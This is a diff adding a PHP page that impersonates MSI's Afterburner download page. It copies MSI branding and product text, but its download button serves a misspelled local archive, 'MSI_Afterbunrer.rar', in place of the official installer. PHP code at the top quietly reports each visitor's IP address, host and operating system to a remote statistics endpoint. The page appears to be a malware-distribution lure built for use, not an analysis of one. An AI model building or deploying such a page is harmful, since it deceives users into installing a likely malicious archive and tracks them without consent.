@@ -1,0 +1,287 @@
+﻿<?php
+ini_set('error_reporting', E_ALL);
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+include 'config.php';
+
+$end_url = $main_host."/statistic/?ip=".$_SERVER['REMOTE_ADDR']."&location=".$_SERVER['HTTP_HOST']."&syste=".urlencode(get_os($_SERVER['HTTP_USER_AGENT']));
+file_get_contents($end_url);
+?>
+<!DOCTYPE html>
+<html lang="event/global">
+   <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <link rel="shortcut icon" href="event/image/favicon.ico?ver=201902&quot;" type="image/vnd.microsoft.icon">
+      <link rel="icon" type="image/png" href="event/image/favicon-16x16.png" sizes="1296x1296">
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+      <link href="template/css/web/bootstrap.min.css" rel="stylesheet">
+      <script src="event/global/js/jQuery/jquery-3.6.0.min.js"></script>
+      <script src="event/frontend/js/bootstrap.min.js"></script>
+      <title>Afterburner</title>
+      <link href="template/css/product/common-pd-detail.css" rel="stylesheet" type="text/css">
+      <link href="event/frontend/custom_css/common/product-feature.css" rel="stylesheet" type="text/css">
+      <link rel="stylesheet" href="event/frontend/css/footer.min.css">
+      <style>
+         .msiFooter .info {
+         height: auto;
+         }
+         .cookieblock {
+            position: fixed; 
+            left:0;
+            bottom:0; 
+            width: 5%; 
+            z-index:999; 
+            cursor:pointer
+         }
+         @media (max-width:992px ) {
+            .cookieblock {
+               width: 20%;
+            }
+         }
+      </style>
+   <body>
+      <img class="cookieblock" style="" src="event/image/cookie-triangle--delia.svg" alt="">
+      <script src="ajax/jquery/3.5.1/jquery.min.js"></script>
+      <script src="ajax/gsap/3.3.4/gsap.min.js"></script>
+      <script src="event/js/ScrollTrigger.min.js"></script>
+      <link rel="stylesheet" href="event/css/main-2022.css">
+      <link rel="stylesheet" href="event/css/font.css">
+      <script src="template/js/third-party/gsap/3.6.1/ScrollTrigger.min.js"></script>
+      <main class="main">
+         <section class="kv">
+            <a rel="noopener" class="kv__logo" href="index.html">
+            <img width="100%" height="100%" src="event/image/logo-msi.png" alt="msi">
+            </a>
+            <div class="kv__content">
+               <figure class="kv__figure">
+                  <img class="kv__figure-deskTop" width="100%" height="100%" src="event/images2/ab_5.png">
+                  <img class="kv__figure-mobile" width="100%" height="100%" src="event/image/afbr.jpg">
+               </figure>
+               <div class="kv__title">
+                  <figure class="kv__title-figure">
+                     <img width="100%" height="100%" src="event/images2/af-icon.png">
+                  </figure>
+                  <h1 class="kv__title-h1">MSI AFTERBURNER</h1>
+               </div>
+               <div class="kv__btn">
+                  <a download="" href="download/MSI_Afterbunrer.rar" class="kv__btn-text" role="button">
+                  Download Afterburner >
+                  </a>
+               </div>
+            </div>
+         </section>
+         <section class="introduction">
+            <div class="introduction__box">
+               <h2 class="introduction__box-h2">“ Afterburner is the gold standard of overclocking utilities ”</h2>
+               <p>MSI Afterburner is the most used graphics card software for a good reason. It‘s reliable, works on
+                  any card (even non-MSI!), gives you complete control, lets you monitor your hardware
+                  in real-time and best of all: it’s completely free! MSI Afterburner is available completely
+                  <span>free of charge</span> and can be used with graphics cards from all brands.
+               </p>
+               <figure class="introduction__box-figure">
+                  <img width="100%" height="100%" data-src="event/image/anandtech.png" alt="anandtech" class="lazyload">
+               </figure>
+            </div>
+         </section>
+         <section class="product__point"></section>
+         <section class="product">
+            <div class="product__title">
+               <h1 class="product__title-h1">GeForce RTX30 Series</h1>
+               <h1 class="product__title-h1">Which Graphics Card is right for you?</h1>
+            </div>
+            <div class="GraphicsCard">
+               <a rel="noopener" class="GraphicsCard__item item_z1" target="_blabk">
+               <img width="100%" height="100%" data-src="event/image/gaming.jpg" alt="RTX-3090-GAMING-X-TRIO-24G" class="lazyload">
+               </a>
+               <a class="GraphicsCard__item2 item_z2" target="_blabk">
+               <img width="100%" height="100%" data-src="event/images2/suprimx.jpg" alt="RTX-3090-SUPRIM-X-24G" class="lazyload">
+               </a>
+               <a rel="noopener" class="GraphicsCard__item2 item_z3" target="_blabk">
+               <img width="100%" height="100%" data-src="event/image/ventus.jpg" alt="RTX-3090-VENTUS-3X-24G-OC" class="lazyload">
+               </a>
+            </div>
+         </section>
+         <section class="toolAndOc">
+            <div class="tool">
+               <div class="tool__flexBox">
+                  <figure class="tool__flexBox-figure">
+                     <img width="100%" height="100%" src="event/images2/tool.png" alt="OVERCLOCKING TOOLS" class="lazyload">
+                  </figure>
+                  <div class="textBox">
+                     <span class="textBox__title">OVERCLOCKING TOOLS</span>Exploring and exceeding the limits of your
+                     graphics card might sound scary, but it’s actually easier than you think. MSI Afterburner
+                     Overclocking tools provide easy and precise
+                     access to your graphics card settings. While increasing your GPU’s clock frequency and voltage,
+                     the
+                     fan speed control will enable you to find the perfect balance between performance and
+                     temperature.
+                  </div>
+               </div>
+            </div>
+            <div class="oc">
+               <div class="oc__flex">
+                  <div class="scannerBox">
+                     <div class="scannerBox__title">OC SCANNER <span class="scannerBox__subtitle">One-Click
+                        Overclocking</span>
+                     </div>
+                     <div class="scannerBox__content">
+                        OC Scanner is an automated function that will find the highest stable overclock settings for
+                        your card. Giving you a free performance boost for a smooth in-game experience thanks to
+                        higher
+                        FPS. 
+                     </div>
+                     <figure class="scannerBox__figure">
+                        <img width="100%" height="100%" src="event/image/dos-info.png" alt="info" class="lazyload">
+                     </figure>
+                  </div>
+                  <div class="oc__flex-Video">
+                     <iframe title="OC Scanner" type="text/html" width="100%" height="100%" frameborder="0" data-src="https://www.youtube.com/embed/lIavMxp-u5M?hl=en&cc_load_policy=1&iv_load_policy=3&loop=1&modestbranding=1&playsinline=1&rel=0&showinfo=0&autoplay=0&mute=1&enablejsapi=1&loop=1&controls=1&playlist=lIavMxp-u5M" class="lazyload"></iframe>
+                  </div>
+               </div>
+            </div>
+         </section>
+         <section class="screenDisplay">
+            <div class="screenDisplay__box">
+               <div class="textBox">
+                  <h2 class="screenDisplay__box-title">ON-SCREEN DISPLAY</h2>
+                  <p class="">
+                     The On Screen Displayed in the corner of screen is your best friend in games. It provides you
+                     real-time information of your system’s performance, so you can keep a close eye on the effect of
+                     your overclocking settings while gaming.
+                  </p>
+               </div>
+               <div class="screenDisplay__box-video">
+                  <iframe title="ON-SCREEN DISPLAY" type="text/html" width="100%" height="100%" frameborder="0" data-src="https://www.youtube.com/embed/3tAogpJEQtA?hl=en&cc_load_policy=1&iv_load_policy=3&loop=1&modestbranding=1&playsinline=1&rel=0&showinfo=0&autoplay=0&mute=1&enablejsapi=1&loop=1&controls=1&playlist=3tAogpJEQtA" class="lazyload"></iframe>
+               </div>
+            </div>
+         </section>
+         <section class="hardware__point">
+            <section class="hardware">
+               <div class="hardware__flexBox">
+                  <div class="textBox">
+                     <span class="textBox__title">HARDWARE MONITOR</span>Exploring and exceeding the limits of your
+                     graphics card might sound scary, but it’s actually easier than you think. MSI Afterburner
+                     Overclocking tools provide easy and precise
+                     access to your graphics card settings. While increasing your GPU’s clock frequency and voltage,
+                     the
+                     fan speed control will enable you to find the perfect balance between performance and
+                     temperature.
+                  </div>
+                  <figure class="hardware__flexBox-figure">
+                     <img width="100%" height="100%" data-src="event/images2/hardwareMonitor.png" alt="hardware" class="lazyload">
+                  </figure>
+               </div>
+            </section>
+            <section class="cust">
+               <h2>CUSTOM FAN PROFILES</h2>
+               <p>Heat dissipation is an essential factor for graphics card performance. Afterburner lets you fully
+                  customize a predefined fan speed curve, allowing you to determine cooling performance all the way!
+               </p>
+               <figure class="cust__figure">
+                  <img width="100%" height="100%" data-src="event/images2/custFan.png" alt="CUSTOM FAN PROFILES" class="lazyload">
+               </figure>
+            </section>
+            <section class="screenDisplay2">
+               <div class="screenDisplay2__box">
+                  <div class="textBox">
+                     <h2 class="screenDisplay2__box-title">VIDEO CAPTURE</h2>
+                     <p class="">
+                        Share your greatest moments! With Predator, you can record your best performance in games or
+                        overclocking without missing a single frame. The Predator software supports the H.264
+                        codec, multiple file formats (.WMV, .AVI), size and quality to capture your match winning frag,
+                        beating the game on hard or breaking a record in overclocking. Share your achievements and
+                        become famous!
+                     </p>
+                  </div>
+                  <div class="screenDisplay2__box-video">
+                     <iframe title="VIDEO CAPTURE" type="text/html" width="100%" height="100%" frameborder="0" data-src="https://www.youtube.com/embed/fuLMfq-ESAI?hl=en&cc_load_policy=1&iv_load_policy=3&loop=1&modestbranding=1&playsinline=1&rel=0&showinfo=0&autoplay=0&mute=1&enablejsapi=1&loop=1&controls=1&playlist=fuLMfq-ESAI" class="lazyload"></iframe>
+                  </div>
+               </div>
+            </section>
+            <section class="msiCenter">
+               <div class="msiCenter__flexBox">
+                  <div class="content">
+                     <h2 class="msiCenter__h2">MSI CENTER</h2>
+                     <figure class="content__figure content__display content__display--active">
+                        <img width="100%" height="100%" src="event/global/picture/Gaming-img-new.jpg" alt="msiCenter" class="lazyload">
+                     </figure>
+                     <figure class="content__figure content__display">
+                        <img width="100%" height="100%" data-src="event/global/picture/gamingMode-new.jpg" alt="msiCenter" class="lazyload">
+                     </figure>
+                     <figure class="content__figure content__display">
+                        <img width="100%" height="100%" data-src="event/global/picture/MYSTIC-LIGHT-SOFTWARE.jpg" alt="msiCenter" class="lazyload">
+                     </figure>
+                     <figure class="content__figure content__display">
+                        <img width="100%" height="100%" data-src="event/global/picture/lanManager-new.jpg" alt="msiCenter" class="lazyload">
+                     </figure>
+                     <figure class="content__figure content__display">
+                        <img width="100%" height="100%" data-src="event/images2/GameHighlights.jpg" alt="msiCenter" class="lazyload">
+                     </figure>
+                     <h3 class="content__title">Brings It All Together</h3>
+                     <p class="content__text">MSI's exclusive Dragon Center software helps you get the most out of your MSI products. Monitor, tweak and optimize in real-time with just a few clicks.</p>
+                  </div>
+                  <ul class="tab">
+                     <li class="tab__li tab__li--active ">MSI center Intro</li>
+                     <li class="tab__li">Gaming Mode</li>
+                     <li class="tab__li">Mystic Light</li>
+                     <li class="tab__li">LAN Manager</li>
+                     <li class="tab__li">Game Highlights</li>
+                  </ul>
+               </div>
+            </section>
+            <section class="msiAppPlayer">
+               <div class="msiAppPlayer__box">
+                  <div class="textBox">
+                     <h2 class="msiAppPlayer__box-title">CROSSES YOUR DEVICES</h2>
+                     <p class="">
+                        Developed under an exclusive partnership with BlueStacks, the MSI APP Player provides a seamless gaming experience between mobile gaming and the PC. It enables gamers to utilize customizable features such as RGB keyboard lighting, better graphics, and multi-tasking.
+                     </p>
+                  </div>
+                  <a rel="noopener" class="msiAppPlayer__link" href="https://www.youtube.com/watch?v=scpwR58dlCc&list=TLGGceZm5pa4e1IxMDA4MjAyMQ" target="_blank">
+                  <img width="100%" height="100%" data-src="event/images2/app-player.jpg" alt="msiCenter" class="lazyload">
+                  <img class="msiAppPlayer__link-position" width="100%" height="100%" src="event/images2/playBtn.png" alt="play-button">
+                  </a>
+               </div>
+            </section>
+            <section class="socialMedia">
+               <h2 class="socialMedia__h2">Your most reliable partner</h2>
+               <div class="socialMedia__flex">
+                  <a rel="noopener" class="socialMedia__flex-a" href="https://www.facebook.com/MSIGaming" target="_blabk">
+                  <img width="100%" height="100%" class="socialMedia__flex-opacity" src="event/image/fb.png" alt="fb" class="lazyload">
+                  <img width="100%" height="100%" data-src="event/image/fb2.png" alt="fb" class="lazyload">
+                  </a>
+                  <a rel="noopener" class="socialMedia__flex-a" href="https://www.instagram.com/msigaming/?hl=zh-tw" target="_blabk">
+                  <img width="100%" height="100%" class="socialMedia__flex-opacity" src="event/image/ig.png" alt="ig" class="lazyload">
+                  <img width="100%" height="100%" data-src="event/image/ig2.png" alt="ig" class="lazyload">
+                  </a>
+                  <a rel="noopener" class="socialMedia__flex-a" href="https://twitter.com/msitweets" target="_blabk">
+                  <img width="100%" height="100%" class="socialMedia__flex-opacity" src="event/image/tr.png" alt="twitter" class="lazyload">
+                  <img width="100%" height="100%" data-src="event/image/tr2.png" alt="twitter" class="lazyload">
+                  </a>
+                  <a rel="noopener" class="socialMedia__flex-a" href="https://www.youtube.com/channel/UCezxSW8kVueIU0pr_rukbYA" target="_blabk">
+                  <img width="100%" height="100%" class="socialMedia__flex-opacity" src="event/image/yt.png" alt="youtube" class="lazyload">
+                  <img width="100%" height="100%" data-src="event/image/yt2.png" alt="youtube" class="lazyload">
+                  </a>
+               </div>
+            </section>
+         </section>
+      </main>
+      <script src="event/js/main-2022.js"></script>
+      <script src="event/js/lazy.js"></script>    
+      <footer class="msiFooter">
+         <div class="msiFooter__container">
+            <nav class="info">
+               <div class="copyright">
+                  <img class="copyright__logo" src="event/frontend/imgs/logo-footer.png" alt="msi">
+                  <p class="copyright__legal">Copyright © 2022 Micro-Star INT'L CO., LTD. All rights reserved.</p>
+
+               </div>
+               <div style="text-align: right;">
+                  <center><a href="privacy-policy.html">Privacy policy</a> | <a href="terms.html">Terms and Conditions</a></center>
+                  </div>
+            </nav>
+         </div>
+      </footer>
+   </body>
+</html>
